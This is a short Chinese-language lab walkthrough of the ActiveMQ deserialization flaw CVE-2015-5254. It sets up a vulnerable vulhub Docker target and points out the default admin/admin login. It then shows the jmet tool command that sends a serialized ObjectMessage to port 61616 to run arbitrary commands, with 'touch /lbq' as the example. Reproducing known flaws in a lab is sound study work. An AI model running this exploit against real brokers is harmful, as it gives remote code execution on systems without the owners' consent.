# 漏洞介绍 #
ActiveMQ反序列化漏洞（CVE-2015-5254）
中文版本(Chinese version)

Apache ActiveMQ是由美国Pachitea（Apache）软件基金会开发的开源消息中间件，支持Java消息传递服务，集群，Spring框架等。

Apache ActiveMQ版本5.x在5.13.0安全漏洞之前，该程序引起的漏洞不限制可以在代理中序列化的类。远程攻击者可以使特殊的序列化Java消息服务（JMS）ObjectMessage对象利用此漏洞来执行任意代码。

参考链接：

https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf


# 环境准备 #

```angular2html
sudo apt-get install docker
sudo apt-get install docker-compose
git clone https://github.com/vulhub/vulhub.git
cd activemq
cd CVE-2015-5254
docker-compose up -d
```
运行环境后，它将在端口61616和8161上建立两个端口。端口61616是工作端口，并在此端口上传递消息。端口8161是网页管理页面端口。访问http://your-Ip:8161，您可以看到网络管理页面

管理后台的路径是：/admin/browse.jsp?JMSDestination=Event

默认密码为：admin/admin

![](https://s2.ax1x.com/2019/01/16/kS0FEj.png)

# 利用 #

```angular2html
git clone https://github.com/matthiaskaiser/jmet.git
cd jmet
wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
```

![](https://s2.ax1x.com/2019/01/16/kS0xo9.md.png)

![](https://s2.ax1x.com/2019/01/16/kSBiQK.png)

利用：

```angular2html
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "你要执行的命令" -Yp ROME your-ip 61616
例子：java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /lbq" -Yp ROME 192.168.3.29 61616
```

![](https://s2.ax1x.com/2019/01/16/kSB8eg.png)